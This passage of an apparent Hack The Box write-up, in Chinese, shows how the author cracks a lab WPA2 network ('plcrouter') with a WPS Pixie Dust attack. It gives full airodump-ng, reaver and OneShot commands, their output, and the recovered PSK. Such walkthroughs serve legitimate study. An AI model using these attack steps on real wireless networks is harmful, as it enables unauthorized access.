+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 啓動 wifi 模塊</span></span><br><span class="line">root@attica01:/root<span class="comment"># ifconfig wlan0 up</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 掃描附近的wifi</span></span><br><span class="line">root@attica01:/root<span class="comment"># iwlist wlan0 scan</span></span><br><span class="line">wlan0     Scan completed :</span><br><span class="line">          Cell 01 - Address: 02:00:00:00:01:00</span><br><span class="line">                    Channel:1</span><br><span class="line">                    Frequency:2.412 GHz (Channel 1)</span><br><span class="line">                    Quality=70/70  Signal level=-30 dBm  </span><br><span class="line">                    Encryption key:on</span><br><span class="line">                    ESSID:<span class="string">&quot;plcrouter&quot;</span></span><br><span class="line">                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s</span><br><span class="line">                              9 Mb/s; 12 Mb/s; 18 Mb/s</span><br><span class="line">                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s</span><br><span class="line">                    Mode:Master</span><br><span class="line">                    Extra:tsf=000613d7767a1af2</span><br><span class="line">                    Extra: Last beacon: 16ms ago</span><br><span class="line">                    IE: Unknown: 0009706C63726F75746572</span><br><span class="line">                    IE: Unknown: 010882848B960C121824</span><br><span class="line">                    IE: Unknown: 030101</span><br><span class="line">                    IE: Unknown: 2A0104</span><br><span class="line">                    IE: Unknown: 32043048606C</span><br><span class="line">                    IE: IEEE 802.11i/WPA2 Version 1</span><br><span class="line">                        Group Cipher : CCMP</span><br><span class="line">                        Pairwise Ciphers (1) : CCMP</span><br><span class="line">                        Authentication Suites (1) : PSK</span><br><span class="line">                    IE: Unknown: 3B025100</span><br><span class="line">                    IE: Unknown: 7F080400000200000040</span><br><span class="line">                    IE: Unknown: DD5C0050F204104A0001101044000102103B00010310470010572CF82FC95756539B16B5CFB298ABF11021000120102300012010240001201042000120105400080000000000000000101100012010080002210C1049000600372A000120</span><br></pre></td></tr></table></figure>
+
+<p>有個 Wifi 名字叫 <code>plcrouter</code>​ 基於WPA2加密，也就是說要想辦法嘗試鏈接這個wifi，那麽問題就來了，我沒有wifi密碼（<code>Authentication Suites (1) : PSK</code>​）。</p>
+<p>這裏嘗試過爆破wifi密碼，但是沒有結果，於是網上搜索如何破解 WPA2 的wifi，找到了這個：<a target="_blank" rel="noopener" href="https://rhinosecuritylabs.com/penetration-testing/wpa-hacking-introduction-wifi-network-security/">WPA Hacking 101 – Introduction to WiFi Network Security</a></p>
+<p>破解wifi密碼大概有兩種：</p>
+<p>第一種：是使用<code>airodump-ng</code>​抓取握手包，然後本地離綫破解，條件是需要有其他設備發送握手，想了想感覺成功率很低，且不太可能。</p>
+<p>第二種：是使用爆破wps的快速握手pin碼，通過得到wifi密碼，前提是有wps支持，爲了知道有沒有wps開啓需要用 <code>airodump-ng</code>​ 抓一下。</p>
+<p>但是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/root<span class="comment"># airodump-ng </span></span><br><span class="line">bash: airodump-ng: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x4-給APT上代理"><a href="#0x4-給APT上代理" class="headerlink" title="0x4 給APT上代理"></a>0x4 給APT上代理</h2><p>由於htb的機器不允許聯網，但是又不想一個一個上傳軟件包，於是想了一些辦法來讓lxc的apt聯網下載。</p>
+<p><strong>備注</strong>：一開始的時候手動安裝proxychains，但是發現系統沒有dig，而且dns的解析有問題，於是apt就炸了，所以才嘗試apt的http代理。</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nano /etc/apt/apt.conf</span><br><span class="line">Acquire::http::Proxy <span class="string">&quot;http://USERNAME:PASSWORD@SERVER:PORT&quot;</span>;</span><br><span class="line">Acquire::https::Proxy <span class="string">&quot;https://USERNAME:PASSWORD@SERVER:PORT&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://askubuntu.com/questions/257290/configure-proxy-for-apt">Configure proxy for APT?</a></p>
+</blockquote>
+<p>需要在本地開啓一個http代理，我使用<a target="_blank" rel="noopener" href="https://github.com/ginuerzh/gost">gost</a>來開啓：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./gost-linux-amd64 -L http://0.0.0.0:9999   </span><br><span class="line">2024/03/17 17:21:05 route.go:695: http://0.0.0.0:9999 on [::]:9999</span><br></pre></td></tr></table></figure>
+
+<p>然後機器上就：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;Acquire::http::Proxy &quot;http://10.10.16.17:9999&quot;;&#x27;</span> &gt; /etc/apt/apt.conf</span><br></pre></td></tr></table></figure>
+
+<p>這樣就可以正常 <code>apt update</code>​了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/root<span class="comment"># apt update</span></span><br><span class="line">Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease</span><br><span class="line">Get:2 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]</span><br><span class="line">Get:3 http://archive.ubuntu.com/ubuntu jammy-updates InRelease [119 kB]</span><br><span class="line">Get:4 http://security.ubuntu.com/ubuntu jammy-security/main amd64 Packages [1246 kB]</span><br><span class="line">Get:5 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 Packages [1462 kB]</span><br><span class="line">Get:6 http://security.ubuntu.com/ubuntu jammy-security/main Translation-en [225 kB]</span><br><span class="line">Get:7 http://security.ubuntu.com/ubuntu jammy-security/restricted amd64 Packages [1531 kB]</span><br><span class="line">Get:8 http://security.ubuntu.com/ubuntu jammy-security/restricted Translation-en [255 kB]                                                                                                </span><br><span class="line">Get:9 http://security.ubuntu.com/ubuntu jammy-security/universe amd64 Packages [850 kB]                                                                                                  </span><br><span class="line">Get:10 http://archive.ubuntu.com/ubuntu jammy-updates/main Translation-en [285 kB]                                                                                                       </span><br><span class="line">Get:11 http://security.ubuntu.com/ubuntu jammy-security/universe Translation-en [162 kB]                                                                                                 </span><br><span class="line">Get:12 http://security.ubuntu.com/ubuntu jammy-security/multiverse amd64 Packages [37.1 kB]                                                                                              </span><br><span class="line">Get:13 http://archive.ubuntu.com/ubuntu jammy-updates/restricted amd64 Packages [1559 kB]                                                                                                </span><br><span class="line">Get:14 http://archive.ubuntu.com/ubuntu jammy-updates/restricted Translation-en [259 kB]                                                                                                 </span><br><span class="line">Get:15 http://archive.ubuntu.com/ubuntu jammy-updates/universe amd64 Packages [1057 kB]                                                                                                  </span><br><span class="line">Get:16 http://archive.ubuntu.com/ubuntu jammy-updates/universe Translation-en [239 kB]                                                                                                   </span><br><span class="line">Get:17 http://archive.ubuntu.com/ubuntu jammy-updates/multiverse amd64 Packages [42.1 kB]                                                                                                </span><br><span class="line">Fetched 9437 kB <span class="keyword">in</span> 9s (1017 kB/s)                                                                                                                                                        </span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">59 packages can be upgraded. Run <span class="string">&#x27;apt list --upgradable&#x27;</span> to see them.</span><br></pre></td></tr></table></figure>
+
+<p>安裝一些需要的工具：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/root<span class="comment"># apt install -y aircrack-ng pciutils </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x5-看看-wifi-有沒有啓用WPS？"><a href="#0x5-看看-wifi-有沒有啓用WPS？" class="headerlink" title="0x5 看看 wifi 有沒有啓用WPS？"></a>0x5 看看 wifi 有沒有啓用WPS？</h2><p>我的目的是要看wifi有沒有wps的支持，要使用 <code>aircrack-ng</code>​ 的工具前需要開啓監聽模式，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/root<span class="comment"># ip a </span></span><br><span class="line">...</span><br><span class="line">5: wlan0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc mq state DOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure>
+
+<p>上面是沒開啓 wlan0 的狀態，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 開啓監聽模式</span></span><br><span class="line">root@attica01:/root<span class="comment"># airmon-ng start wlan0</span></span><br><span class="line"></span><br><span class="line">Found 1 processes that could cause trouble.</span><br><span class="line">Kill them using <span class="string">&#x27;airmon-ng check kill&#x27;</span> before putting</span><br><span class="line">the card <span class="keyword">in</span> monitor mode, they will interfere by changing channels</span><br><span class="line">and sometimes putting the interface back <span class="keyword">in</span> managed mode</span><br><span class="line"></span><br><span class="line">    PID Name</span><br><span class="line">    165 wpa_supplicant</span><br><span class="line"></span><br><span class="line">PHY     Interface       Driver          Chipset</span><br><span class="line"></span><br><span class="line">phy2    wlan0           mac80211_hwsim  Software simulator of 802.11 radio(s) <span class="keyword">for</span> mac80211</span><br><span class="line">                (mac80211 monitor mode vif enabled <span class="keyword">for</span> [phy2]wlan0 on [phy2]wlan0mon)</span><br><span class="line">                (mac80211 station mode vif disabled <span class="keyword">for</span> [phy2]wlan0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然後會有新的網卡出現，一般都是 網卡名字 + mon</span></span><br><span class="line">root@attica01:/root<span class="comment"># ip a </span></span><br><span class="line">3: wlan0mon: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ieee802.11/radiotap 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure>
+
+<p>如果看到 <code>wlan0mon</code>​ 説明成功的開啓監聽模式，根據<a target="_blank" rel="noopener" href="https://kalitut.com/wireless-access-points-with-wps-enabled/">這篇</a>來搜索wps的wifi：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/root<span class="comment"># airodump-ng wlan0 --wps</span></span><br><span class="line"></span><br><span class="line"> CH  4 ][ Elapsed: 0 s ][ 2024-03-17 09:31 </span><br><span class="line"></span><br><span class="line"> BSSID              PWR  Beacons    <span class="comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID</span></span><br><span class="line"></span><br><span class="line"> 02:00:00:00:01:00  -28       22        0    0   1   54   WPA2 CCMP   PSK  2.0    plcrouter                                                                                            </span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes</span><br><span class="line"></span><br><span class="line">Quitting...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>會看到wifi中，<code>WPS</code>​ 是開啓了 2.0的版本，看回 <a target="_blank" rel="noopener" href="https://rhinosecuritylabs.com/penetration-testing/wpa-hacking-introduction-wifi-network-security/">WPA Hacking 101 – Introduction to WiFi Network Security</a> 可以使用reaver 進行 PIN 爆破。</p>
+<h2 id="0xFA-reaver-和-bully-失敗"><a href="#0xFA-reaver-和-bully-失敗" class="headerlink" title="0xFA reaver 和 bully 失敗"></a>0xFA reaver 和 bully 失敗</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/root<span class="comment"># apt install -y reaver bully</span></span><br></pre></td></tr></table></figure>
+
+<p>由於上面開啓了監聽模式，所以可以直接使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/root<span class="comment"># reaver -i wlan0mon -b 02:00:00:00:01:00 -K 1</span></span><br><span class="line"></span><br><span class="line">Reaver v1.6.5 WiFi Protected Setup Attack Tool</span><br><span class="line">Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;</span><br><span class="line"></span><br><span class="line">[+] Waiting <span class="keyword">for</span> beacon from 02:00:00:00:01:00</span><br><span class="line">[+] Received beacon from 02:00:00:00:01:00</span><br><span class="line">[!] Found packet with bad FCS, skipping...</span><br><span class="line">[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)</span><br></pre></td></tr></table></figure>
+
+<p>不過不知道爲什麽會卡住，由於知道了攻擊的手法是：<code>Pixie Dust</code>​ （爲什麽會知道？因爲 <a target="_blank" rel="noopener" href="https://rhinosecuritylabs.com/penetration-testing/wpa-hacking-introduction-wifi-network-security/">WPA Hacking 101 – Introduction to WiFi Network Security</a> 裏有寫），於是網上找了其他的工具，</p>
+<p>順便找到了原理：<a target="_blank" rel="noopener" href="https://hackenproof.com/blog/for-hackers/how-to-hack-wifi-wps-pixie-dust">Vulnerability Tutorial: WPS Pixie Dust Attack</a></p>
+<h2 id="0x6-OneShot"><a href="#0x6-OneShot" class="headerlink" title="0x6 OneShot"></a>0x6 OneShot</h2><p>嘗試找了一些工具，無意中發現了這個：<a target="_blank" rel="noopener" href="https://github.com/nikita-yfh/OneShot-C">https://github.com/nikita-yfh/OneShot-C</a></p>
+<p>他的特點是使用的時候不需要進入監聽模式： <code>OneShot-С performs Pixie Dust attack without having to switch to monitor mode.</code>​</p>
+<p>所以乾脆試試看。</p>
+<h3 id="需要注意的是"><a href="#需要注意的是" class="headerlink" title="需要注意的是"></a>需要注意的是</h3><p>儅提示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/root<span class="comment"># ./oneshot -i wlan0 -K -b 02:00:00:00:01:00</span></span><br><span class="line">[*] Running wpa_supplicant...</span><br><span class="line">[*] Trying pin 12345670...</span><br><span class="line">[*] Scanning...</span><br><span class="line">[*] Authenticating...</span><br><span class="line">[+] Authenticated</span><br><span class="line">[*] Associating with AP...</span><br><span class="line">[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)</span><br><span class="line">[*] Received Identity Request</span><br><span class="line">[*] Sending Identity Response...</span><br><span class="line">[*] Received WPS Message M1</span><br><span class="line">[P] E-Nonce: fd75f9e019808e0080882fecc003ae0e</span><br><span class="line">[*] Building Message M2</span><br><span class="line">[P] PKR: a13efe57827c799ad4c284987fed8e3ea9b5668da8a7003db9ddb9a4e722e3c5a20baa306b39ef6b61f35d6c97695fb2169570588b3c4ca144ff983288be65fa8262ed9a21162e3d8f24edd8d408fa7546f34d757c08c623c776f31908e54956eaa5963afdc69db5852b54d1f380b4fb917e41ef111f6385f00f94ed379a8050d56d5ac0eb0520b8acd8166d71c021ca2d87dd11d608d90ea75e17934492f2232639f61bffeb2aa3a92b2c283445148932803e199356d00278a0acd02a860ce6</span><br><span class="line">[P] PKE: 7991c62dfb0346917e3e4c64bf75e1b94dc367705eb538e09c00602af3b11a9fac3a9645246d3df6869e46f5a7fe872f9e10ae7586c585cedc59068b954e71eac4ffef8f3a43b45b617e1f01c8f6afd2902e28d6eb457d406df1149e87f7a1dda48b0465822d27be52fbb03fcb06ceea30a3377a5903d23079d735cbd200160c8be4c94615af25d8584d2f5ee48da136d4cd786409fbc896ff5ff3ce3c79658b4a6e902083311735d3269a1350e81072da8f85aaf1b6d016533cae5d5341f830</span><br><span class="line">[P] Authkey: 6fa68fd631de7f04819bdad4ddb9749ae988bcac492e256cb73885b0412c680b</span><br><span class="line">[*] Received WPS Message M3</span><br><span class="line">[P] E-Hash1: 91bf1ea9b8a88f25aa438246b1f2cc18d95969694ce89e7ccc1cc0835ca0eaff</span><br><span class="line">[P] E-Hash2: a5ec690f0bea1cfef411aec9cc50738602c148c9cc61ea59c38ef6e05a737b7f</span><br><span class="line">[*] Building Message M4</span><br><span class="line">[*] Received WPS Message M5</span><br><span class="line">[*] Building Message M6</span><br><span class="line">[*] Received WPS Message M7</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>
+
+<p>或者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/root<span class="comment"># ./oneshot -i wlan0 -K -b 02:00:00:00:01:00</span></span><br><span class="line">[*] Running wpa_supplicant...</span><br><span class="line">[*] Trying pin 12345670...</span><br><span class="line">[*] Scanning...</span><br><span class="line">[*] Authenticating...</span><br><span class="line">[*] Scanning...</span><br><span class="line">[*] Authenticating...</span><br><span class="line">[*] Scanning...</span><br></pre></td></tr></table></figure>
+
+<p>的時候，恭喜你可以重設了。</p>
+<p>如果成功的話會顯示wifi密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/opt/PLC/OpenPLC_v3/webserver<span class="comment"># ./oneshot -i wlan0 -b 02:00:00:00:01:00 -K</span></span><br><span class="line">[*] Running wpa_supplicant...</span><br><span class="line">[*] Trying pin 12345670...</span><br><span class="line">[*] Scanning...</span><br><span class="line">[*] Authenticating...</span><br><span class="line">[+] Authenticated</span><br><span class="line">[*] Associating with AP...</span><br><span class="line">[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)</span><br><span class="line">[*] Received Identity Request</span><br><span class="line">[*] Sending Identity Response...</span><br><span class="line">[*] Received WPS Message M1</span><br><span class="line">[P] E-Nonce: 72c3d3bbb6ed8deff8451705fc0625b4</span><br><span class="line">[*] Building Message M2</span><br><span class="line">[P] PKR: 26b504f0d9cb4f36478d6462e57a9e07c7daf1d0dec17446c1304d5c3b01429c3f3b346b6ac03980a4eb2ec27d205ee0c4fbb76fada6da65b8db50981863abb459fda83e2b19935734ccc883df2d55a12832bdb92905e174d0daeb83239287ac7838f3b78f6d940d38e3f74edc7f582026b60fd09d9732a5157a92169b603fa9efe6ee5fc4bda885cd1fd6eea12923d265d7edd28804902f3696c208e4356fe6c2f4d9dc6f4171658accfe53ed7de921d614d5344eefd018ed249acbaca63448</span><br><span class="line">[P] PKE: 85614467fbda75cdffb3010bded877e32fb3ef7497680e132d4fb33ea0a2f854c59914980ee9e5d3286aaaec0c2dcf5afa6cfd55b82f8fc1a8aecc3c80bffed6a352887196d1e8f2aaa733dace48aebf86ae70c25361fa07a13eb6adf9eeb26e32bba0ee7dcf6c56f766f7d961e8766e06aae99a26ea9d04872ce1ba746997635519e7e99dec43dbde3784d345ff24f834ff8ca2da6807db7426d695336c40ed0024db7e321da69084c4f60b88d89496d47647a7819b9eab5265fc45401cb633</span><br><span class="line">[P] Authkey: 5758e8c0d2225e4f0187ef9d5a339d31f981c51287f619e618b56157bce7f537</span><br><span class="line">[*] Received WPS Message M3</span><br><span class="line">[P] E-Hash1: 5289eb0d121b1c6fa8dcea41aae1ee1503fabf79f30ce816ba8826d87571ebac</span><br><span class="line">[P] E-Hash2: 1f0ffa43cb0f2aa6ae1104190794bdb4e028a19f6856ac7a58e8a35f6195643b</span><br><span class="line">[*] Building Message M4</span><br><span class="line">[*] Received WPS Message M5</span><br><span class="line">[*] Building Message M6</span><br><span class="line">[*] Received WPS Message M7</span><br><span class="line">[+] WPS PIN: 12345670</span><br><span class="line">[+] WPA PSK: NoWWEDoKnowWhaTisReal123!</span><br><span class="line">[+] AP SSID: plcrouter</span><br></pre></td></tr></table></figure>
+
+<p>​<code>NoWWEDoKnowWhaTisReal123!</code>​ 就是wifi密碼。</p>
+<h2 id="0x7-連接-wifi"><a href="#0x7-連接-wifi" class="headerlink" title="0x7 連接 wifi"></a>0x7 連接 wifi</h2><p>由於知道了wifi的密碼，終於可以鏈接wifi了，網上找到了這篇：<a target="_blank" rel="noopener" href="https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant">Connecting to WiFi network using systemd and wpa-supplicant</a></p>
+<p>跟著提示新增一些文件：</p>
+<p>​<code>/etc/wpa_supplicant/wpa_supplicant-wlan0.conf</code>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface=/var/run/wpa_supplicant</span><br><span class="line">ctrl_interface_group=0</span><br><span class="line">update_config=1</span><br><span class="line"></span><br><span class="line">network=&#123;</span><br><span class="line">  ssid=&quot;plcrouter&quot;</span><br><span class="line">  psk=&quot;NoWWEDoKnowWhaTisReal123!&quot;</span><br><span class="line">  key_mgmt=WPA-PSK</span><br><span class="line">  proto=WPA2</span><br><span class="line">  pairwise=CCMP TKIP</span><br><span class="line">  group=CCMP TKIP</span><br><span class="line">  scan_ssid=1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​<code>/etc/systemd/network/25-wlan.network</code>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Match]</span><br><span class="line">Name=wlan0</span><br><span class="line"></span><br><span class="line">[Network]</span><br><span class="line">DHCP=ipv4</span><br></pre></td></tr></table></figure>
+
+<p>然後執行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> wpa_supplicant@wlan0.service</span><br><span class="line">systemctl restart systemd-networkd.service</span><br><span class="line">systemctl restart wpa_supplicant@wlan0.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重啓下網卡</span></span><br><span class="line">ifconfig wlan0 down</span><br><span class="line">ifconfig wlan0 up</span><br></pre></td></tr></table></figure>
+
+<p>怎麽知道有沒有連接成功？ 可以查看内核日志</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:.root <span class="comment"># dmesg</span></span><br><span class="line">[ 6845.699206] wlan0: deauthenticating from 02:00:00:00:01:00 by <span class="built_in">local</span> choice (Reason: 3=DEAUTH_LEAVING)</span><br><span class="line">[ 6851.939751] wlan0: authenticate with 02:00:00:00:01:00</span><br><span class="line">[ 6851.954209] wlan0: send auth to 02:00:00:00:01:00 (try 1/3)</span><br><span class="line">[ 6851.954930] wlan0: authenticated</span><br><span class="line">[ 6851.955450] wlan0: authenticate with 02:00:00:00:01:00</span><br><span class="line">[ 6851.955453] wlan0: send auth to 02:00:00:00:01:00 (try 1/3)</span><br><span class="line">[ 6851.957134] wlan0: authenticated</span><br><span class="line">[ 6851.959535] mac80211_hwsim hwsim2 wlan0: disabling HT as WMM/QoS is not supported by the AP</span><br><span class="line">[ 6851.959539] mac80211_hwsim hwsim2 wlan0: disabling VHT as WMM/QoS is not supported by the AP</span><br><span class="line">[ 6851.962609] wlan0: associate with 02:00:00:00:01:00 (try 1/3)</span><br><span class="line">[ 6851.964090] wlan0: RX AssocResp from 02:00:00:00:01:00 (capab=0x411 status=0 aid=1)</span><br><span class="line">[ 6851.964123] wlan0: associated</span><br><span class="line">[ 6851.969811] IPv6: ADDRCONF(NETDEV_CHANGE): wlan0: <span class="built_in">link</span> becomes ready</span><br><span class="line">[ 6861.985657] wlan0: deauthenticating from 02:00:00:00:01:00 by <span class="built_in">local</span> choice (Reason: 3=DEAUTH_LEAVING)</span><br><span class="line">[ 6866.063118] wlan0: authenticate with 02:00:00:00:01:00</span><br><span class="line">[ 6866.063248] wlan0: send auth to 02:00:00:00:01:00 (try 1/3)</span><br><span class="line">[ 6866.065000] wlan0: authenticated</span><br><span class="line">[ 6866.067452] mac80211_hwsim hwsim2 wlan0: disabling HT as WMM/QoS is not supported by the AP</span><br><span class="line">[ 6866.067455] mac80211_hwsim hwsim2 wlan0: disabling VHT as WMM/QoS is not supported by the AP</span><br><span class="line">[ 6866.090034] wlan0: associate with 02:00:00:00:01:00 (try 1/3)</span><br><span class="line">[ 6866.090916] wlan0: RX AssocResp from 02:00:00:00:01:00 (capab=0x411 status=0 aid=1)</span><br><span class="line">[ 6866.090940] wlan0: associated</span><br></pre></td></tr></table></figure>
+
+<p>然後查看網卡</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">6: wlan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 42:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.1.71/24 metric 1024 brd 192.168.1.255 scope global dynamic wlan0</span><br><span class="line">       valid_lft 43158sec preferred_lft 43158sec</span><br><span class="line">    inet6 fe80::4000:ff:fe00:200/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
+
+<p>看到 <code>state UP</code>​ 就可以了，一開始的時候要等一下才可以獲得ip地址，我試過獲取ip地址最長的時間也等了20分鐘。</p>
